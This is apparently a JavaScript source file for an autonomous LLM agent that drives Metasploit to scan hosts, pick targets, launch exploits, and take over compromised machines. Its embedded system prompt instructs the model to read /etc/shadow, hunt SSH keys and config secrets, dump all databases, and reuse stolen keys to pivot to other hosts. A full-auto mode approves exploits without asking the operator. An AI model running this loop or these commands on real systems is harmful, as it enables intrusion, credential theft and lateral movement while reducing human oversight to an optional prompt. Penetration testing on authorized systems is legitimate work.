// Autonomous agent (Autopilot)
// A decision loop: each turn the model picks one action (run a module, run a command
// in an open session, scan, or finish), observes the result, and decides again.
// Behavior switches with state: with no session it goes for a foothold; with a
// session open it stops exploiting that host and enumerates/loots/pivots through it.
let _agentOn = false, _agentSteps = 0, _agentMax = 30, _agentAutoExploit = false, _agentHistory = [], _agentSeen = new Set(), _agentPivots = new Set();

// Canonical signature of an action, for detecting exact repeats.
function agentSig(a) {
    return [a.tool, a.module || '', a.command || '', a.session_id || a.session || '', a.target || '']
        .join('|').toLowerCase().replace(/\s+/g, ' ').trim();
}

// Cap a single command's output so one broad `ls`/dump can't flood the context
// window. The full run history is still kept; this only bounds one result, and
// nudges the model toward targeted searches. Real files (shadow/keys/configs) are
// well under the cap and pass through untouched.
// Cap a single command's output to its most recent N lines, so a giant dump
// (e.g. a multi-thousand-line auth.log) doesn't flood the view or the context.
function agentCapOutput(out, maxLines = 1000) {
    out = '' + out;
    const lines = out.split('\n');
    if (lines.length <= maxLines) return out;
    return `[... ${lines.length - maxLines} earlier lines truncated; showing the most recent ${maxLines} lines ...]\n` +
           lines.slice(-maxLines).join('\n');
}

function toggleAutopilot() {
    if (_agentOn) { agentStop('stopped by operator'); return; }
    agentStart();
}
function setAgentButton(on) {
    const btn = document.getElementById('autopilot-btn');
    if (!btn) return;
    btn.classList.toggle('bg-violet-600', on);
    btn.classList.toggle('text-white', on);
    btn.classList.toggle('text-gray-400', !on);
    btn.querySelector('span').textContent = on ? 'Agent — Stop' : 'Autopilot';
}
function agentStop(reason) {
    _agentOn = false;
    setAgentButton(false);
    if (reason) aiAddMessage('system-inject', `🤖 Agent stopped — ${escHtml(reason)}.`);
}

async function agentStart() {
    switchTab('kroftai');
    // Auto-pick the most promising matrix host if the operator hasn't chosen one.
    if (!aiCurrentTarget) {
        const picked = await agentPickTarget();
        if (!picked) { alert('No hosts in the matrix yet — run a scan first.'); return; }
        aiCurrentTarget = picked;
        const sel = document.getElementById('ai-target-select');
        if (sel) sel.value = picked;
        if (typeof aiTargetChanged === 'function') aiTargetChanged();
        aiAddMessage('system-inject', `🤖 Agent auto-selected target <span class="font-mono text-violet-300">${escHtml(picked)}</span> (best attack surface in the matrix).`);
    }
    _agentAutoExploit = confirm('Autonomous Agent\n\nOK = FULL AUTO (auto-approve exploits)\nCancel = ask me before each exploit');
    _agentOn = true; _agentSteps = 0; _agentHistory = []; _agentSeen = new Set(); _agentPivots = new Set();
    setAgentButton(true);
    aiAddMessage('system-inject',
        `🤖 <b>Agent engaged</b> against <span class="font-mono text-violet-300">${escHtml(aiCurrentTarget)}</span> — mode: ${_agentAutoExploit ? 'full auto' : 'confirm exploits'}, budget ${_agentMax} actions. Plan: recon → foothold → enumerate &amp; loot → pivot.`);

    if (!window._aiPlanModules || !window._aiPlanModules.length) {
        aiAddMessage('system-inject', '🤖 Running initial analysis to map the attack surface…');
        try { await runKroftAnalysis(); } catch {}
    }
    agentLoop();
}

// AI ranks the matrix and returns the best initial target IP.
async function agentPickTarget() {
    let hosts = allHosts;
    if (!hosts || !hosts.length) { try { await fetchHosts(); hosts = allHosts; } catch {} }
    if (!hosts || !hosts.length) return null;
    if (hosts.length === 1) return hosts[0].ip;
    const list = hosts.map(h => `${h.ip} | ${h.os || '?'} | ${(h.ports || '').replace(/\n/g, ' ')}`).join('\n');
    const SYS = `You select the single best initial target for a penetration test — the host with the most exposed or exploitable services. Respond with ONLY its IP address, nothing else.`;
    try {
        const reply = (await callOllama(SYS, `Hosts:\n${list}\n\nReturn just the IP.`)).trim();
        const m = reply.match(/\b\d{1,3}(\.\d{1,3}){3}\b/);
        if (m && hosts.some(h => h.ip === m[0])) return m[0];
    } catch {}
    return hosts[0].ip;
}

async function agentLoop() {
    let rejects = 0;
    while (_agentOn && _agentSteps < _agentMax) {
        let action;
        try { action = JSON.parse(extractJsonBlock(await agentDecideRaw())); }
        catch (e) { aiAddMessage('system-inject', `🤖 Could not parse a decision (${escHtml(e.message)}) — retrying once.`);
            try { action = JSON.parse(extractJsonBlock(await agentDecideRaw())); } catch { break; } }
        if (!action || !action.tool) { aiAddMessage('system-inject', '🤖 No actionable decision — stopping.'); break; }
        if (action.tool === 'finish') { agentStop(action.why || 'objective reached'); return; }

        // Reject exact-repeat actions (the small model loves to loop on id/netstat/passwd).
        // Don't consume a step; note it and re-decide, then bail if it stays stuck.
        const sig = agentSig(action);
        if (_agentSeen.has(sig)) {
            rejects++;
            aiAddMessage('system-inject', `🤖 skipping repeat — already ran <span class="font-mono text-gray-500">${escHtml(action.module || action.command || action.target || action.tool)}</span>; picking something new`);
            // Don't pollute the transcript; the full history plus the do-not-repeat
            // list already tell the model what it has done.
            if (rejects >= 3) { agentStop('it kept repeating itself — paused so you can steer it'); return; }
            continue;
        }
        rejects = 0;
        _agentSeen.add(sig);
        _agentSteps++;
        if (action.why) aiAddMessage('system-inject', `🤖 <span class="text-gray-400">step ${_agentSteps}/${_agentMax}:</span> ${escHtml(action.why)}`);
        const outcome = await agentExecute(action);
        // Keep the whole run's transcript verbatim, every command and its full output,
        // so the model has complete context. If it eventually exceeds the model's
        // context window, the LLM server trims the oldest messages itself.
        _agentHistory.push({ step: _agentSteps, action, outcome: '' + outcome });
        if (!_agentOn) return;

        // At the budget, offer to keep going instead of hard-stopping mid-momentum.
        if (_agentSteps >= _agentMax) {
            if (confirm(`Agent has run ${_agentSteps} actions. Continue for 15 more?`)) {
                _agentMax += 15;
            } else {
                agentStop(`reached action budget (${_agentSteps})`);
                return;
            }
        }
    }
    if (_agentOn) agentStop(`reached action budget (${_agentMax})`);
}

async function agentSessions() {
    try { return await (await fetch('/api/msf/sessions')).json(); } catch { return []; }
}

async function agentDecideRaw() {
    const host = allHosts.find(h => h.ip === aiCurrentTarget);
    const recon = host ? buildReconContext(host) : `Target IP: ${aiCurrentTarget}`;
    const sessions = await agentSessions();
    const sessTxt = sessions.length
        ? sessions.map(s => `- session ${s.id}: ${s.type} on ${s.target}`).join('\n')
        : '(none yet — you still need a foothold)';
    const cands = (window._aiPlanModules || []).slice(0, 20).map(m => `${m.module} [${m.type || 'exploit'}]`).join('\n') || '(none loaded — consider a scan)';
    const lootTxt = (_lootCache || []).slice(0, 12).map(l => `- ${l.type}: ${l.username ? l.username + '/' : ''}${l.value} (${l.host_ip})`).join('\n') || '(none yet)';
    // Full transcript of this run, every command and its complete output, untruncated,
    // so the model reasons over everything it has learned.
    const hist = _agentHistory.map(h => {
        const label = h.action.module || h.action.command || h.action.target || '';
        return `${h.step}. [${h.action.tool}] ${label}\n   → ${h.outcome}`;
    }).join('\n') || '(nothing yet)';
    // Explicit do-not-repeat list built from what already executed.
    const executed = [...new Set(_agentHistory.map(h => `${h.action.tool}:${h.action.command || h.action.module || h.action.target || ''}`.trim()))];
    const doneTxt = executed.length ? executed.join('  |  ') : '(none)';

    const SYS = `You are Kroft Agent, an autonomous penetration tester operating on the operator's OWN authorized network. You work in a loop: choose ONE action, observe its result, then choose the next.

PRIORITY (strict order):
1. RECON — understand the services on the target.
2. FOOTHOLD — gain a session using the single most likely exploit.
3. POST-EXPLOITATION — the moment a session is open on a host, STOP running exploits against that host. Use session_command to: confirm privileges (id), then EXTRACT SECRETS, then map the network for pivoting (arp -a, ip route, netstat -tnp).
4. PIVOT — use discovered hosts/credentials to reach new machines: scan them, then exploit with run_module using "target".

EXTRACTING SECRETS (do this aggressively once you have a shell — prefer reading files over more 'ls'):
- If root/privileged: cat /etc/shadow.
- Find secrets with TARGETED searches, NOT by listing big directories:
    find / -name "id_rsa" -o -name "id_dsa" -o -name "*.kdbx" 2>/dev/null
    find / -name "*.conf" -o -name "wp-config.php" -o -name "database.yml" -o -name "*.pgpass" 2>/dev/null
    grep -rIl -i "password" /var/www /etc 2>/dev/null | head
  NEVER run a bare 'ls' on a directory with many files (e.g. /var/www/tikiwiki) — it floods context. Use find/grep to jump straight to the file, then cat it (use the EXACT filename).

WEAPONIZE WHAT YOU LOOT (don't just collect it — USE it):
- Database access: if you found DB creds (e.g. in a config) or have root, DUMP the data:
    mysql -u root -e 'select host,user,password from mysql.user;'
    mysqldump -u root --all-databases 2>/dev/null | head -200
    (try the creds from any config file you read; postgres: sudo -u postgres psql -c '\\l')
- Captured SSH private keys: reuse them to log into OTHER hosts you discovered:
    chmod 600 <keyfile>; ssh -i <keyfile> -o StrictHostKeyChecking=no <user>@<pivot-ip> id
- Password hashes from /etc/shadow: you already captured them to Findings for offline cracking — move on, don't re-read shadow.

HARD RULES:
- If ANY session is open on the current target, you MUST use session_command (or scan/pivot). NEVER launch another exploit against an already-compromised host.
- After a scan reveals a NEW host with open services (see "Pivot targets"), your NEXT action MUST engage that host (run_module with "target", or ssh in with a captured key). Do not drift back to re-enumerating the owned host.
- The full transcript of everything you have already done this run is provided. READ IT. NEVER repeat anything in "Already executed" — that work is done and its result is in the transcript. Always pick a NEW, higher-value action that builds on what you have learned.
- When you have read a file (shadow, a key, a history), you HAVE it — move on to something new (another user's key, a pivot host, a database dump, privilege escalation).
- Prefer modules from the candidate list (verified to exist). Copy the path exactly.
- Output ONLY one JSON object, no prose.

ACTIONS:
{"tool":"run_module","module":"<exact module path>","target":"<optional ip; defaults to primary target>","why":"short reason"}
{"tool":"session_command","session_id":"<id>","command":"<shell/meterpreter cmd>","why":"short reason"}
{"tool":"scan","target":"<ip or cidr>","why":"short reason"}
{"tool":"finish","why":"short reason"}`;

    const pivotTxt = _agentPivots.size
        ? [..._agentPivots].join(', ') + ' — scanned and NOT yet attacked; engage these next'
        : '(none yet — discover with arp -a / scan)';

    const USR = `Primary target: ${aiCurrentTarget}${host && host.os ? ` (${host.os})` : ''}
Recon:
${recon}

Open sessions:
${sessTxt}

Pivot targets (discovered, awaiting attack):
${pivotTxt}

Candidate modules (verified real):
${cands}

Captured loot:
${lootTxt}

Already executed (DO NOT repeat any of these):
${doneTxt}

Full transcript this run (commands you ran and what they returned):
${hist}

Given everything above, choose the single best NEW next action as JSON.`;
    return await callOllama(SYS, USR);
}

async function agentExecute(action) {
    // Run a command inside an open session
    if (action.tool === 'session_command') {
        const sid = action.session_id || action.session || '';
        const cmd = action.command || '';
        if (!sid || !cmd) return 'missing session_id or command';
        aiAddMessage('system-inject', `🤖 session ${escHtml(String(sid))} ➜ <span class="font-mono text-cyan-300">${escHtml(cmd)}</span>`);
        let out = '';
        try {
            const d = await (await fetch(`/api/msf/sessions/${encodeURIComponent(sid)}/exec`, {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ cmd })
            })).json();
            out = d.output || d.error || '';
        } catch (e) { out = 'error: ' + e.message; }
        const capped = out.trim() ? agentCapOutput(out) : '(no output)';
        appendAgentOutput(`session ${sid}: ${cmd}`, capped);
        const sess = (await agentSessions()).find(s => String(s.id) === String(sid));
        kaiExtractLoot(`session ${sid}: ${cmd}`, out, (sess && sess.target) || aiCurrentTarget);
        return capped;
    }
    // Recon / pivot scan
    if (action.tool === 'scan') {
        const tgt = action.target || aiCurrentTarget;
        aiAddMessage('system-inject', `🤖 scanning <span class="font-mono">${escHtml(tgt)}</span>…`);
        return await agentScanAndWait(tgt);
    }
    // Launch a module (optionally against a pivot host via action.target)
    if (action.tool === 'run_module') {
        const mod = (action.module || '').trim();
        if (!mod) return 'no module specified';
        const tgt = (action.target || aiCurrentTarget || '').trim();
        const type = mod.startsWith('auxiliary/') ? 'auxiliary' : mod.startsWith('post/') ? 'post' : 'exploit';
        if (type === 'exploit' && !_agentAutoExploit) {
            if (!confirm(`Agent wants to launch EXPLOIT:\n\n${mod}\n\nagainst ${tgt}. Proceed?`))
                return 'operator declined this exploit — choose a different approach';
        }
        aiAddMessage('system-inject', `🤖 launching ${moduleChip(mod)}${tgt !== aiCurrentTarget ? ` against <span class="font-mono">${escHtml(tgt)}</span>` : ''}…`);
        const before = (await agentSessions()).map(s => String(s.id));
        let options = { RHOSTS: tgt };
        try {
            const bare = mod.replace(/^(exploit|auxiliary|post)\//, '');
            const info = await (await fetch(`/api/msf/modules/info?module=${encodeURIComponent(bare)}&type=${type}`)).json();
            if (info && info.options) options = { ...options, ...(await kaiAiFillOptions(mod, type, info.options)), RHOSTS: tgt };
        } catch {}
        const r = await dispatchModuleAndWait(mod, options, tgt);
        _agentPivots.delete(tgt);   // we engaged this host, no longer "pending"
        const fresh = (await agentSessions()).filter(s => !before.includes(String(s.id)));
        if (fresh.length) {
            const s = fresh[0];
            aiAddMessage('system-inject', `✅ <b>Session ${escHtml(String(s.id))}</b> opened (${escHtml(s.type)}) on ${escHtml(s.target)} — switching to post-exploitation.`);
            kaiNotify('Session opened', `Session ${s.id} via ${mod}`);
            fetchSessions();
            return `SUCCESS — session ${s.id} (${s.type}) opened on ${s.target}. Now use session_command on session ${s.id} to enumerate and pivot. Do NOT exploit this host again.`;
        }
        const cappedOut = agentCapOutput(r.output || 'no session opened');
        appendAgentOutput(mod, cappedOut);
        return `${r.status}: ${cappedOut}`;
    }
    return 'unknown action';
}

async function dispatchModuleAndWait(module, options, target) {
    try {
        const res = await fetch('/api/msf/exploit', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ target_ip: target || aiCurrentTarget, module, options })
        });
        const d = await res.json();
        if (!res.ok || !d.job_id) return { status: 'error', output: d.error || res.statusText };
        const deadline = Date.now() + 55000;
        let out = '', status = 'running';
        while (Date.now() < deadline && _agentOn) {
            await new Promise(r => setTimeout(r, 2000));
            try {
                const j = await (await fetch(`/api/msf/jobs/${d.job_id}/output`)).json();
                status = j.status || status; out = j.output || out;
                if (!['running', 'queued', 'launched'].includes(String(status).toLowerCase())) break;
            } catch {}
        }
        return { status, output: out };
    } catch (e) { return { status: 'error', output: e.message }; }
}

async function agentScanAndWait(target) {
    try {
        const res = await fetch('/api/scan', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ target, custom_args: '-sV -T4 --top-ports 100' })
        });
        const d = await res.json();
        if (!d.job_id) return 'scan dispatch failed: ' + (d.error || '');
        const deadline = Date.now() + 90000;
        while (Date.now() < deadline && _agentOn) {
            await new Promise(r => setTimeout(r, 3000));
            const jobs = await (await fetch('/api/jobs')).json();
            const j = jobs.find(x => x.id === d.job_id);
            if (j && j.status !== 'Running') break;
        }
        await fetchHosts();
        const h = (allHosts || []).find(x => x.ip === target);
        if (h && h.ports) {
            if (target !== aiCurrentTarget) _agentPivots.add(target);
            return `scan of ${target} complete. Open services:\n${h.ports}\n` +
                   `NEXT ACTION: engage ${target} now — run_module with "target":"${target}" and a module matching one of these services (or session_command to ssh in with a captured key). Do NOT go back to enumerating the already-owned host.`;
        }
        return `scan of ${target} complete; no open services found (or host did not respond).`;
    } catch (e) { return 'scan error: ' + e.message; }
}

function appendAgentOutput(label, out) {
    if (out && out.trim())
        aiAddMessage('assistant', `<div class="text-[11px] font-mono text-green-300 whitespace-pre-wrap break-words bg-[#050608] border border-[#1f222a] rounded p-2 max-h-48 overflow-y-auto custom-scrollbar">${escHtml(out)}</div>`, label);
}

// Poll ollama status alongside other pollers
setInterval(() => {
    if (document.getElementById('kroftai').classList.contains('flex')) checkOllamaStatus();
}, 15000);

setInterval(fetchJobs, 3000);
setInterval(checkMsfStatus, 10000);
setInterval(() => {
    if (document.getElementById('matrix').classList.contains('flex')) fetchHosts();
    if (document.getElementById('shells').classList.contains('flex')) fetchSessions();
    if (document.getElementById('pentest').classList.contains('flex')) fetchExploitLogs();
    if (document.getElementById('postaux').classList.contains('flex')) paRefreshSessions(false);
}, 5000);

